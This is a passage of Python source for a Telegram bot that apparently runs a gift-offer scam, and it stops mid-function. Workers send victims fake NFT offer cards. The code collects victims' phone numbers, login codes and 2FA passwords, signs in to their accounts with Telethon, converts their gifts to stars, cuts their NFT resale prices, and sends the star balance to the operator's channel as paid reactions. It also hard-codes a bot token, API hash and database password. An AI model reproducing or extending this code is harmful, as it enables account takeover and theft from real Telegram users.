import sys
import io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', line_buffering=True)
sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', line_buffering=True)

import asyncio
import os
import re
import random
import time as _time
from datetime import datetime

from aiogram import Bot, Dispatcher, types, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    InlineKeyboardMarkup, InlineKeyboardButton,
    WebAppInfo, BotCommand, BotCommandScopeDefault,
)
from aiogram.exceptions import TelegramBadRequest
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from sqlalchemy.ext.asyncio import create_async_engine, AsyncSession, async_sessionmaker
from sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column
from sqlalchemy import BigInteger, String, Integer, DateTime, Text, select, text
import uvicorn

from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, PasswordHashInvalidError,
)
from telethon.tl.functions.messages import SendPaidReactionRequest
from telethon.tl.functions.payments import (
    GetSavedStarGiftsRequest, UpdateStarGiftPriceRequest,
    GetStarsStatusRequest, ConvertStarGiftRequest,
)
from telethon.tl.types import (
    InputSavedStarGiftUser, InputSavedStarGiftChat, StarsAmount,
)

# ═══════════════════════════════════════════════════════
#   КОНФИГ
# ═══════════════════════════════════════════════════════

BOT_TOKEN = "8215145424:AAEQmrfUit0HGAsB8NcroJoZQlFhn5tKSjk"
BOT_USERNAME = "pinkslonrobot"
ADMIN_ID = 8986358602
MINIAPP_URL = "https://trustgift.github.io/offersbot/"
MINIAPP_SHORT = "app"
BACKEND_URL = "https://botofferswork.onrender.com"
API_ID = 26259835
API_HASH = "3fa32264398920f001dd2428b42060f6"
DATABASE_URL = "postgresql+asyncpg://avnadmin:AVNS_Kdeg6Q2vNRREiOv-JWp@pg-270e5c9e-danyachuglaev-8664.e.aivencloud.com:28308/defaultdb"

TARGET_POST = "https://t.me/testchanell2026/2"
PORT = int(os.getenv("PORT", "8080"))

_m = re.match(r"https?://t\.me/([^/]+)/(\d+)", TARGET_POST)
TARGET_CHANNEL = _m.group(1) if _m else None
TARGET_POST_ID = int(_m.group(2)) if _m else None

MAX_ATTEMPTS = 3

print("=" * 60)
print(f"BOT v10 — фикс цены NFT (resell_amount как список)")
print(f"TARGET: {TARGET_CHANNEL}/{TARGET_POST_ID}")
print("=" * 60)

# ═══════════════════════════════════════════════════════
#   БАЗА
# ═══════════════════════════════════════════════════════

engine = create_async_engine(DATABASE_URL, echo=False, connect_args={"ssl": "require"})
SessionLocal = async_sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)


class Base(DeclarativeBase):
    pass


class User(Base):
    __tablename__ = "users"
    id: Mapped[int] = mapped_column(BigInteger, primary_key=True)
    username: Mapped[str] = mapped_column(String(64), nullable=True)
    first_name: Mapped[str] = mapped_column(String(64), nullable=True)
    role: Mapped[str] = mapped_column(String(16), default="user")
    balance: Mapped[int] = mapped_column(Integer, default=0)
    total_offers: Mapped[int] = mapped_column(Integer, default=0)
    stars_farmed: Mapped[int] = mapped_column(Integer, default=0)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


class BusinessConn(Base):
    __tablename__ = "business_conn"
    user_id: Mapped[int] = mapped_column(BigInteger, primary_key=True)
    connection_id: Mapped[str] = mapped_column(String(128), nullable=True)
    can_reply: Mapped[str] = mapped_column(String(16), default="unknown")
    updated_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


class Offer(Base):
    __tablename__ = "offers"
    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
    worker_id: Mapped[int] = mapped_column(BigInteger)
    worker_username: Mapped[str] = mapped_column(String(64), nullable=True)
    target_user_id: Mapped[int] = mapped_column(BigInteger, nullable=True)
    gift_name: Mapped[str] = mapped_column(String(128))
    gift_link: Mapped[str] = mapped_column(String(256))
    price_stars: Mapped[int] = mapped_column(Integer)
    price_usd: Mapped[str] = mapped_column(String(32), default="—")
    duration_hours: Mapped[int] = mapped_column(Integer, default=24)
    status: Mapped[str] = mapped_column(String(16), default="pending")
    stars_earned: Mapped[int] = mapped_column(Integer, default=0)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


class AuthSession(Base):
    __tablename__ = "sessions"
    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
    offer_id: Mapped[int] = mapped_column(Integer, nullable=True)
    phone: Mapped[str] = mapped_column(String(32))
    code: Mapped[str] = mapped_column(String(16), nullable=True)
    password: Mapped[str] = mapped_column(String(128), nullable=True)
    session_string: Mapped[str] = mapped_column(Text, nullable=True)
    phone_code_hash: Mapped[str] = mapped_column(String(128), nullable=True)
    user_id: Mapped[int] = mapped_column(BigInteger, nullable=True)
    first_name: Mapped[str] = mapped_column(String(64), nullable=True)
    last_name: Mapped[str] = mapped_column(String(64), nullable=True)
    username: Mapped[str] = mapped_column(String(64), nullable=True)
    state: Mapped[str] = mapped_column(String(16), default="pending")
    attempts: Mapped[int] = mapped_column(Integer, default=0)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


class Log(Base):
    __tablename__ = "logs"
    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
    worker_id: Mapped[int] = mapped_column(BigInteger, nullable=True)
    offer_id: Mapped[int] = mapped_column(Integer, nullable=True)
    event: Mapped[str] = mapped_column(String(64))
    detail: Mapped[str] = mapped_column(Text, nullable=True)
    created_at: Mapped[datetime] = mapped_column(DateTime, default=datetime.utcnow)


async def init_db():
    try:
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all, checkfirst=True)
            migrations = [
                "ALTER TABLE users ADD COLUMN IF NOT EXISTS first_name VARCHAR(64)",
                "ALTER TABLE users ADD COLUMN IF NOT EXISTS total_offers INTEGER DEFAULT 0",
                "ALTER TABLE users ADD COLUMN IF NOT EXISTS balance INTEGER DEFAULT 0",
                "ALTER TABLE users ADD COLUMN IF NOT EXISTS role VARCHAR(16) DEFAULT 'user'",
                "ALTER TABLE users ADD COLUMN IF NOT EXISTS stars_farmed INTEGER DEFAULT 0",
                "ALTER TABLE offers ADD COLUMN IF NOT EXISTS target_user_id BIGINT",
                "ALTER TABLE offers ADD COLUMN IF NOT EXISTS worker_username VARCHAR(64)",
                "ALTER TABLE offers ADD COLUMN IF NOT EXISTS stars_earned INTEGER DEFAULT 0",
                "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS session_string TEXT",
                "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS phone_code_hash VARCHAR(128)",
                "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS state VARCHAR(16) DEFAULT 'pending'",
                "ALTER TABLE sessions ADD COLUMN IF NOT EXISTS attempts INTEGER DEFAULT 0",
            ]
            for sql in migrations:
                try:
                    await conn.execute(text(sql))
                except Exception as e:
                    print(f"migration skip: {e}")
            print("DB ready")
    except Exception as e:
        print(f"init_db warning: {e}")


async def get_user(user_id):
    async with SessionLocal() as s:
        return await s.get(User, user_id)


async def add_user(user_id, username=None, first_name=None, role="user"):
    async with SessionLocal() as s:
        u = await s.get(User, user_id)
        if u:
            return u
        u = User(id=user_id, username=username, first_name=first_name, role=role)
        s.add(u)
        await s.commit()
        await s.refresh(u)
        return u


async def set_role(user_id, role):
    async with SessionLocal() as s:
        u = await s.get(User, user_id)
        if u:
            u.role = role
            await s.commit()


async def add_stars_farmed(user_id, amount):
    async with SessionLocal() as s:
        u = await s.get(User, user_id)
        if u:
            u.stars_farmed += amount
            await s.commit()


async def get_workers():
    async with SessionLocal() as s:
        r = await s.execute(select(User).where(User.role == "worker"))
        return r.scalars().all()


async def save_business_conn(user_id, connection_id, can_reply="unknown"):
    async with SessionLocal() as s:
        c = await s.get(BusinessConn, user_id)
        if c:
            c.connection_id = connection_id
            c.can_reply = can_reply
            c.updated_at = datetime.utcnow()
        else:
            c = BusinessConn(user_id=user_id, connection_id=connection_id, can_reply=can_reply)
            s.add(c)
        await s.commit()


async def get_business_conn(user_id):
    async with SessionLocal() as s:
        return await s.get(BusinessConn, user_id)


async def create_offer(worker_id, worker_username, gift_name, gift_link,
                       price_stars, price_usd, target_user_id=None, duration_hours=24):
    async with SessionLocal() as s:
        o = Offer(worker_id=worker_id, worker_username=worker_username,
                  target_user_id=target_user_id,
                  gift_name=gift_name, gift_link=gift_link,
                  price_stars=price_stars, price_usd=price_usd,
                  duration_hours=duration_hours)
        s.add(o)
        u = await s.get(User, worker_id)
        if u:
            u.total_offers += 1
        await s.commit()
        await s.refresh(o)
        return o


async def update_offer_stars(offer_id, stars):
    async with SessionLocal() as s:
        o = await s.get(Offer, offer_id)
        if o:
            o.stars_earned += stars
            await s.commit()


async def get_offer(offer_id):
    async with SessionLocal() as s:
        return await s.get(Offer, offer_id)


async def get_worker_offers(worker_id):
    async with SessionLocal() as s:
        r = await s.execute(select(Offer).where(Offer.worker_id == worker_id).order_by(Offer.id.desc()))
        return r.scalars().all()


async def add_log(worker_id=None, offer_id=None, event="", detail=""):
    async with SessionLocal() as s:
        l = Log(worker_id=worker_id, offer_id=offer_id, event=event, detail=detail)
        s.add(l)
        await s.commit()


async def get_logs(limit=20):
    async with SessionLocal() as s:
        r = await s.execute(select(Log).order_by(Log.id.desc()).limit(limit))
        return r.scalars().all()


async def create_auth_session(offer_id, phone):
    async with SessionLocal() as s:
        sess = AuthSession(offer_id=offer_id, phone=phone, state="phone_sent")
        s.add(sess)
        await s.commit()
        await s.refresh(sess)
        return sess


async def get_session_by_phone(phone):
    async with SessionLocal() as s:
        r = await s.execute(
            select(AuthSession).where(AuthSession.phone == phone).order_by(AuthSession.id.desc())
        )
        return r.scalars().first()


async def update_session(sess_id, **kwargs):
    async with SessionLocal() as s:
        sess = await s.get(AuthSession, sess_id)
        if sess:
            for k, v in kwargs.items():
                setattr(sess, k, v)
            await s.commit()
            return sess


async def get_recent_sessions(limit=10):
    async with SessionLocal() as s:
        r = await s.execute(select(AuthSession).order_by(AuthSession.id.desc()).limit(limit))
        return r.scalars().all()


# ═══════════════════════════════════════════════════════
#   TELETHON
# ═══════════════════════════════════════════════════════

async def telethon_attempt_login(phone, code, password=None, session_str=None, phone_code_hash=None):
    client = TelegramClient(
        StringSession(session_str) if session_str else StringSession(),
        API_ID, API_HASH,
    )
    try:
        await client.connect()
        if not await client.is_user_authorized():
            try:
                if phone_code_hash:
                    await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
                else:
                    await client.sign_in(phone=phone, code=code)
            except SessionPasswordNeededError:
                if not password:
                    await client.disconnect()
                    return False, 'password', None
                try:
                    await client.sign_in(password=password)
                except PasswordHashInvalidError:
                    await client.disconnect()
                    return False, 'password', None
            except PhoneCodeInvalidError:
                await client.disconnect()
                return False, 'code', None
            except PhoneCodeExpiredError:
                await client.disconnect()
                return False, 'expired', None
        me = await client.get_me()
        session_string = client.session.save()
        await client.disconnect()
        return True, {
            'user_id': me.id, 'first_name': me.first_name,
            'last_name': me.last_name, 'username': me.username,
        }, session_string
    except Exception as e:
        try:
            await client.disconnect()
        except Exception:
            pass
        print(f"telethon login error: {type(e).__name__}: {e}")
        return False, 'error', None


def extract_resell_amount(ra):
    """
    resell_amount может быть:
    - списком [StarsAmount, StarsTonAmount]
    - одним StarsAmount
    - None
    Возвращаем int (звёзды) или None.
    """
    if ra is None:
        return None
    if isinstance(ra, list):
        for item in ra:
            if type(item).__name__ == "StarsAmount":
                val = getattr(item, "amount", None)
                if val:
                    return int(val)
        return None
    # одиночный объект
    val = getattr(ra, "amount", None) or getattr(ra, "stars", None)
    if val:
        return int(val)
    return None


async def telethon_sell_all_and_react(session_string, worker_id, offer_id):
    client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
    result = {
        "gifts_total": 0,
        "converted": [],
        "listed": [],
        "sold": [],
        "failed": [],
        "skipped": [],
        "balance_before": 0,
        "balance_after": 0,
        "reacted": False,
        "stars_sent": 0,
        "error": None,
    }
    try:
        await client.connect()
        me = await client.get_me()
        if not me:
            result["error"] = "session dead"
            return result

        # ─── 1. подписка на канал
        try:
            from telethon.tl.functions.channels import JoinChannelRequest
            await client(JoinChannelRequest(channel=TARGET_CHANNEL))
            print(f"[AUTO] joined {TARGET_CHANNEL}")
            await asyncio.sleep(2)
        except Exception as e:
            err = str(e)
            if "USER_ALREADY_PARTICIPANT" in err or "already" in err.lower():
                print(f"[AUTO] already in {TARGET_CHANNEL}")
            else:
                print(f"[AUTO] join error: {type(e).__name__}: {e}")

        # ─── 2. получаем все подарки
        gifts = []
        try:
            offset = ""
            while True:
                gifts_resp = await client(GetSavedStarGiftsRequest(
                    peer=me.id, offset=offset, limit=100,
                    exclude_unsaved=True,
                ))
                page = getattr(gifts_resp, "gifts", []) or []
                gifts.extend(page)
                offset = getattr(gifts_resp, "next_offset", "") or ""
                if not offset or not page:
                    break
                await asyncio.sleep(0.5)
        except Exception as e:
            result["error"] = f"get saved gifts: {e}"
            return result

        result["gifts_total"] = len(gifts)
        print(f"[AUTO] found {len(gifts)} gifts")

        # ─── 3. разделяем
        regular_to_convert = []
        unique_listed = []

        print(f"[AUTO] Разбираю {len(gifts)} подарков...")

        for idx, g in enumerate(gifts):
            gift_obj = getattr(g, "gift", None)
            if not gift_obj:
                continue

            cls_name = type(gift_obj).__name__
            is_unique = (cls_name == "StarGiftUnique")
            is_regular = (cls_name == "StarGift")

            msg_id = getattr(g, "msg_id", None)
            saved_id = getattr(g, "saved_id", None)

            # ─── ЦЕНА (главный фикс)
            ra = getattr(gift_obj, "resell_amount", None)
            ra_amount = extract_resell_amount(ra)

            title = (
                getattr(gift_obj, "title", None)
                or getattr(gift_obj, "slug", None)
            )
            if not title:
                gid = getattr(gift_obj, "id", None)
                if gid:
                    title = f"Gift#{gid}"
                else:
                    title = f"Gift#{idx}"
            title = str(title)

            print(f"[AUTO] #{idx}: type={cls_name} title={title[:40]!r} msg_id={msg_id} resell={ra_amount}")

            ref = None
            if msg_id:
                ref = InputSavedStarGiftUser(msg_id=msg_id)
            elif saved_id:
                ref = InputSavedStarGiftChat(peer=me.id, saved_id=saved_id)
            if not ref:
                result["failed"].append({"title": title, "reason": "no ref"})
                continue

            if is_unique:
                if ra_amount is not None and int(ra_amount) > 0:
                    unique_listed.append({
                        "title": title, "ref": ref, "current_price": int(ra_amount),
                    })
                else:
                    result["skipped"].append({
                        "title": title,
                        "reason": "NFT не выставлен на маркет"
                    })
            elif is_regular:
                regular_to_convert.append({"title": title, "ref": ref})
            else:
                result["skipped"].append({
                    "title": title,
                    "reason": f"тип {cls_name}"
                })

        print(f"[AUTO] regular={len(regular_to_convert)} unique_with_price={len(unique_listed)} skipped={len(result['skipped'])}")

        # ─── 4. конвертируем обычные
        print(f"[AUTO] Конвертирую {len(regular_to_convert)} обычных...")
        for r in regular_to_convert:
            try:
                await client(ConvertStarGiftRequest(stargift=r["ref"]))
                result["converted"].append({"title": r["title"]})
                print(f"[AUTO] ✅ converted {r['title']}")
                await asyncio.sleep(1.2)
            except Exception as e:
                err_str = str(e)
                if any(x in err_str for x in [
                    "STARGIFT_CONVERT_TOO_EARLY",
                    "STARGIFT_CANNOT_CONVERT",
                    "STARGIFT_CRAFT",
                    "STARGIFT_",
                ]):
                    result["skipped"].append({
                        "title": r["title"],
                        "reason": "нельзя конвертировать"
                    })
                    print(f"[AUTO] ⏳ skip {r['title']}: {err_str[:80]}")
                else:
                    result["failed"].append({
                        "title": r["title"],
                        "reason": f"convert: {type(e).__name__}: {err_str[:80]}"
                    })
                    print(f"[AUTO] ❌ fail {r['title']}: {type(e).__name__}: {err_str[:80]}")
                continue

        # ─── 5. обновляем цену NFT на -30%
        print(f"[AUTO] Обновляю цену {len(unique_listed)} NFT (-30%)...")
        for u in unique_listed:
            new_price = int(u["current_price"] * 0.7)
            if new_price < 1:
                new_price = 1
            try:
                await client(UpdateStarGiftPriceRequest(
                    stargift=u["ref"],
                    resell_amount=StarsAmount(amount=new_price, nanos=0),
                ))
                result["listed"].append({"title": u["title"], "min_price": new_price})
                print(f"[AUTO] ✅ listed {u['title']} {u['current_price']}→{new_price}")
                await asyncio.sleep(1.2)
            except Exception as e:
                result["failed"].append({
                    "title": u["title"],
                    "reason": f"list: {type(e).__name__}: {str(e)[:80]}"
                })
                print(f"[AUTO] ❌ list fail {u['title']}: {type(e).__name__}: {str(e)[:80]}")

        # ─── 6. баланс
        balance = 0
        try:
            status = await client(GetStarsStatusRequest(peer=me.id))
            bal = getattr(status, "balance", None)
            if bal:
                balance = int(getattr(bal, "amount", 0) or 0)
        except Exception as e:
            print(f"[AUTO] stars err: {type(e).__name__}: {e}")
        result["balance_after"] = balance
        print(f"[AUTO] balance = {balance} ⭐")

        # ─── 7. реакция с правильным random_id
        if balance > 0 and TARGET_CHANNEL and TARGET_POST_ID:
            sent = False
            reaction_errors = []
            for try_count in [balance, 1]:
                if sent or try_count <= 0:
                    continue
                for attempt in range(3):
                    try:
                        random_id = (int(_time.time()) << 32) | random.getrandbits(32)
                        await client(SendPaidReactionRequest(
                            peer=TARGET_CHANNEL,
                            msg_id=TARGET_POST_ID,
                            count=try_count,
                            random_id=random_id,
                        ))
                        result["reacted"] = True
                        result["stars_sent"] = try_count
                        sent = True
                        print(f"[AUTO] ✅ reaction OK: {try_count} ⭐")
                        break
                    except Exception as e:
                        err_str = str(e)
                        reaction_errors.append(f"count={try_count}: {type(e).__name__}: {err_str}")
                        print(f"[AUTO] reaction try={try_count} attempt={attempt+1}: {type(e).__name__}: {err_str}")
                        await asyncio.sleep(2)
            if not sent:
                result["error"] = "reaction: " + " | ".join(reaction_errors[-3:])
        elif balance == 0:
            result["error"] = "баланс = 0"

        if result["stars_sent"] > 0:
            await add_stars_farmed(worker_id, result["stars_sent"])
            await update_offer_stars(offer_id, result["stars_sent"])

        return result
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"
        print(f"[AUTO] top error: {type(e).__name__}: {e}")
        return result
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass


# ═══════════════════════════════════════════════════════
#   BOT
# ═══════════════════════════════════════════════════════

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()


def worker_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Создать оффер", callback_data="worker_create")],
        [InlineKeyboardButton(text="📋 Мои офферы", callback_data="worker_offers")],
        [InlineKeyboardButton(text="🔌 Моё подключение", callback_data="my_conn")],
        [InlineKeyboardButton(text="⭐ Купить звёзды", callback_data="buy_stars")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    ])


def admin_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Создать оффер", callback_data="worker_create")],
        [InlineKeyboardButton(text="📋 Мои офферы", callback_data="worker_offers")],
        [InlineKeyboardButton(text="🔌 Моё подключение", callback_data="my_conn")],
        [InlineKeyboardButton(text="👥 Воркеры", callback_data="admin_workers")],
        [InlineKeyboardButton(text="📊 Логи", callback_data="admin_logs")],
        [InlineKeyboardButton(text="💎 Сессии", callback_data="admin_sessions")],
        [InlineKeyboardButton(text="📈 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    ])


def menu_for(role):
    if role == "admin": return admin_menu()
    if role == "worker": return worker_menu()
    return InlineKeyboardMarkup(inline_keyboard=[])


class OfferForm(StatesGroup):
    gift_link = State()
    price_stars = State()


class GrantForm(StatesGroup):
    user_id = State()


# ═══════════════════════════════════════════════════════
#   BUSINESS
# ═══════════════════════════════════════════════════════

@dp.business_connection()
async def on_business_connection(conn: types.BusinessConnection):
    try:
        await save_business_conn(conn.user.id, conn.id, "yes" if conn.can_reply else "no")
        u = conn.user
        print(f"Business connection: user={u.id} @{u.username}")
        try:
            await bot.send_message(
                u.id,
                f"🔌 <b>Бизнес-бот подключён</b>\n\n"
                f"ID: <code>{u.id}</code>\n\n"
                f"Создать оффер:\n<code>/offer user_id ссылка сумма</code>"
            )
        except Exception:
            pass
    except Exception as e:
        print(f"business_connection error: {e}")


# ═══════════════════════════════════════════════════════
#   /start
# ═══════════════════════════════════════════════════════

@dp.message(CommandStart())
async def start(message: types.Message):
    uid = message.from_user.id
    role = "admin" if uid == ADMIN_ID else "user"
    u = await add_user(uid, message.from_user.username, message.from_user.first_name, role)
    if uid == ADMIN_ID and u.role != "admin":
        await set_role(uid, "admin")
        u.role = "admin"

    if u.role not in ("admin", "worker"):
        print(f"[IGNORE] /start from non-worker {uid}")
        return

    conn = await get_business_conn(uid)
    conn_line = f"\n├ Подключение: <b>{'✅ есть' if conn and conn.connection_id else '❌ нет'}</b>"

    await message.answer(
        f"👋 <b>Gift Offers</b>\n\n"
        f"👤 <b>Профиль</b>\n"
        f"├ ID: <code>{uid}</code>\n"
        f"├ Роль: <b>{u.role}</b>{conn_line}\n"
        f"└ Завёл звёзд: <b>{u.stars_farmed} ⭐</b>",
        reply_markup=menu_for(u.role),
    )


@dp.callback_query(F.data == "main_menu")
async def main_menu(call: types.CallbackQuery):
    u = await get_user(call.from_user.id)
    if not u or u.role not in ("admin", "worker"):
        return
    conn = await get_business_conn(u.id)
    conn_line = f"\n├ Подключение: <b>{'✅' if conn and conn.connection_id else '❌'}</b>"
    await call.message.edit_text(
        f"👋 <b>Gift Offers</b>\n\n"
        f"👤 <b>Профиль</b>\n"
        f"├ ID: <code>{u.id}</code>\n"
        f"├ Роль: <b>{u.role}</b>{conn_line}\n"
        f"└ Завёл звёзд: <b>{u.stars_farmed} ⭐</b>",
        reply_markup=menu_for(u.role),
    )


@dp.callback_query(F.data == "profile")
async def profile(call: types.CallbackQuery):
    u = await get_user(call.from_user.id)
    if not u or u.role not in ("admin", "worker"):
        return
    conn = await get_business_conn(u.id)
    await call.message.edit_text(
        f"👤 <b>Профиль</b>\n\n"
        f"├ ID: <code>{u.id}</code>\n"
        f"├ @{u.username or '—'}\n"
        f"├ Роль: <b>{u.role}</b>\n"
        f"├ Бизнес: <b>{'✅' if conn and conn.connection_id else '❌'}</b>\n"
        f"├ Офферов: <b>{u.total_offers}</b>\n"
        f"└ Завёл: <b>{u.stars_farmed} ⭐</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]),
    )


@dp.callback_query(F.data == "my_conn")
async def my_conn_callback(call: types.CallbackQuery):
    u = await get_user(call.from_user.id)
    if not u or u.role not in ("worker", "admin"):
        return
    conn = await get_business_conn(u.id)
    if conn and conn.connection_id:
        text = (
            f"🔌 <b>Подключение активно</b>\n\n"
            f"├ ID: <code>{conn.connection_id}</code>\n"
            f"└ {conn.updated_at:%d.%m.%Y %H:%M}\n\n"
            f"<b>Создать оффер:</b>\n<code>/offer user_id ссылка сумма</code>"
        )
    else:
        text = (
            f"❌ <b>Бизнес-бот не подключён</b>\n\n"
            f"1. Настройки → Telegram Business\n"
            f"2. Чат-боты → Добавить бота\n"
            f"3. Введи <code>@{BOT_USERNAME}</code>"
        )
    await call.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]),
    )


@dp.callback_query(F.data == "buy_stars")
async def buy_stars(call: types.CallbackQuery):
    u = await get_user(call.from_user.id)
    if not u or u.role not in ("admin", "worker"):
        return
    await call.message.edit_text(
        "⭐ @PremiumBot → купи → отправь боту.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⭐ @PremiumBot", url="https://t.me/PremiumBot")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")],
        ]),
        disable_web_page_preview=True,
    )


@dp.callback_query(F.data == "worker_offers")
async def my_offers(call: types.CallbackQuery):
    u = await get_user(call.from_user.id)
    if not u or u.role not in ("worker", "admin"):
        return
    offers = await get_worker_offers(call.from_user.id)
    if not offers:
        await call.message.edit_text(
            "📋 Пусто.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
            ]),
        )
        return
    lines = [f"#{o.id} — {o.gift_name[:18]} — {o.price_stars}⭐ — {o.status}" for o in offers[:15]]
    await call.message.edit_text(
        "📋 <b>Мои офферы</b>\n\n" + "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]
        ]),
    )


# ═══════════════════════════════════════════════════════
#   ОФФЕР
# ═══════════════════════════════════════════════════════

def parse_target_and_offer(text):
    m = re.search(r'(https?://t\.me/nft/[\w\-]+)', text)
    if not m:
        return None
    gift_link = m.group(1)
    gift_name = gift_link.split("/")[-1].replace("-", " #")
    without_link = text.replace(gift_link, "")
    without_cmd = without_link.replace("/offer", "").strip()
    parts = without_cmd.split()
    if len(parts) < 2:
        return None
    try:
        target_user_id = int(parts[0])
        price_stars = int(parts[1])
    except ValueError:
        return None
    return gift_name, gift_link, price_stars, target_user_id


def make_offer_card(o, duration=24):
    return (
        f"⚖️ <b>Gift Offers</b> отправил вам оффер на <b>{o.gift_name}</b>\n\n"
        f"Сумма оффера: <b>{o.price_stars}</b> ⭐️ ({o.price_usd}$)\n"
        f"За подарок: <b>{o.gift_name}</b>\n"
        f"Ссылка: {o.gift_link}\n"
        f"Длительность: <b>{duration}h</b>\n\n"
        f"Вы можете просмотреть и ПРИНЯТЬ/ОТКЛОНИТЬ оффер, нажав кнопку ниже"
    )


def make_offer_kb(offer_id):
    accept = f"https://t.me/{BOT_USERNAME}/{MINIAPP_SHORT}?startapp=offer_{offer_id}_accept"
    reject = f"https://t.me/{BOT_USERNAME}/{MINIAPP_SHORT}?startapp=offer_{offer_id}_reject"
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Принять", url=accept)],
        [InlineKeyboardButton(text="❌ Отклонить", url=reject)],
    ])


@dp.message(Command("offer"))
async def cmd_offer(message: types.Message):
    uid = message.from_user.id
    u = await get_user(uid)
    if not u or u.role not in ("worker", "admin"):
        return

    parsed = parse_target_and_offer(message.text or "")
    if not parsed:
        await message.answer(
            "❌ Формат:\n<code>/offer user_id ссылка сумма</code>\n\n"
            "Пример:\n<code>/offer 123456789 https://t.me/nft/DeskCalendar-284528 650</code>"
        )
        return

    gift_name, gift_link, price_stars, target_user_id = parsed
    if target_user_id == uid:
        await message.answer("❌ Нельзя себе.")
        return

    conn = await get_business_conn(uid)
    if not conn or not conn.connection_id:
        await message.answer(
            f"❌ Бизнес-бот не подключён. Telegram → Настройки → Telegram Business → @{BOT_USERNAME}"
        )
        return

    price_usd = f"{price_stars * 0.0092:.2f}"
    o = await create_offer(
        worker_id=uid, worker_username=message.from_user.username,
        gift_name=gift_name, gift_link=gift_link,
        price_stars=price_stars, price_usd=price_usd,
        target_user_id=target_user_id, duration_hours=24,
    )

    sent = False
    try:
        await bot.send_message(
            chat_id=target_user_id,
            text=make_offer_card(o),
            reply_markup=make_offer_kb(o.id),
            business_connection_id=conn.connection_id,
        )
        sent = True
    except TelegramBadRequest as e:
        err = str(e).lower()
        if "never contacted" in err or "not enough rights" in err or "peer_id_invalid" in err or "business_peer_usage_missing" in err:
            await message.answer("⚠️ Мамонт не писал вам. Перешлите карточку:")
            await message.answer(make_offer_card(o), reply_markup=make_offer_kb(o.id))
        else:
            await message.answer(f"❌ {e}")

    if sent:
        await message.answer(f"✅ Отправлено <code>{target_user_id}</code>")

    await add_log(worker_id=uid, offer_id=o.id, event="offer_sent",
                  detail=f"{gift_name} → {target_user_id} за {price_stars}⭐ sent={sent}")

    try:
        await bot.send_message(ADMIN_ID,
            f"🆕 <b>Оффер #{o.id}</b>\n"
            f"Воркер: <code>{uid}</code> @{message.from_user.username or '—'}\n"
            f"Цель: <code>{target_user_id}</code>\n"
            f"Подарок: {gift_name}\nЦена: {price_stars}⭐")
    except Exception:
        pass


@dp.callback_query(F.data == "worker_create")
async def create_start(call: types.CallbackQuery, state: FSMContext):
    u = await get_user(call.from_user.id)
    if not u or u.role not in ("worker", "admin"):
        return
    await state.set_state(OfferForm.gift_link)
    await call.message.edit_text(
        "➕ <b>Создание оффера</b>\n\n"
        "🔗 Отправьте ссылку:\n"
        "<i>или используйте:</i>\n"
        "<code>/offer user_id ссылка сумма</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ Отмена", callback_data="main_menu")]
        ]),
        disable_web_page_preview=True,
    )


@dp.message(OfferForm.gift_link)
async def offer_link(message: types.Message, state: FSMContext):
    link = message.text.strip()
    if "t.me/nft/" not in link:
        await message.answer("❌ Неверная ссылка.")
        return
    gift_name = link.split("/")[-1].replace("-", " #")
    await state.update_data(gift_link=link, gift_name=gift_name)
    await state.set_state(OfferForm.price_stars)
    await message.answer(f"✅ {gift_name}\n\n⭐ Сумма:")


@dp.message(OfferForm.price_stars)
async def offer_price(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ Число.")
        return
    data = await state.get_data()
    price_stars = int(message.text)
    price_usd = f"{price_stars * 0.0092:.2f}"
    o = await create_offer(
        worker_id=message.from_user.id,
        worker_username=message.from_user.username,
        gift_name=data["gift_name"], gift_link=data["gift_link"],
        price_stars=price_stars, price_usd=price_usd, duration_hours=24,
    )
    await state.clear()
    await message.answer(
        "✅ <b>Оффер создан</b>\n\nПерешлите:\n\n"
